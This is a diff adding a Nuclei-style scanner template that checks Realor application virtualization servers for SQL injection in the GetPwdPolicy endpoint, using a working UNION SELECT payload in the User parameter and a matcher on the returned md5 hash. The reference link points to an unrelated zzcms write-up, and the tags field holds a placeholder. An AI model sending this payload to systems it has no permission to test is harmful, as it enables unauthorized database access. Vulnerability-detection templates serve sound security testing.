@@ -1,0 +1,22 @@
+id: REALOR-GetPwdPolicy-User-sqli
+
+info:
+  name: REALOR-GetPwdPolicy-User-sqli
+  author: wangzong
+  severity: high
+  description: 瑞友天翼应用虚拟化系统GetPwdPolicy存在SQL注入漏洞
+  reference:
+    - https://github.com/En0t5/vul/blob/main/zzcms/zzcms-add_list-sql-inject.md
+  tags: tags
+variables:
+  filename: "{{to_lower(rand_base(6))}}"
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/RAPAgent.XGI?CMD=GetPwdPolicy&User=1%27+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CCONCAT%280x7e%2C%28SELECT+md5(1)%29%2C0x7e%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+-"
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'c4ca4238a0b923820dcc5'
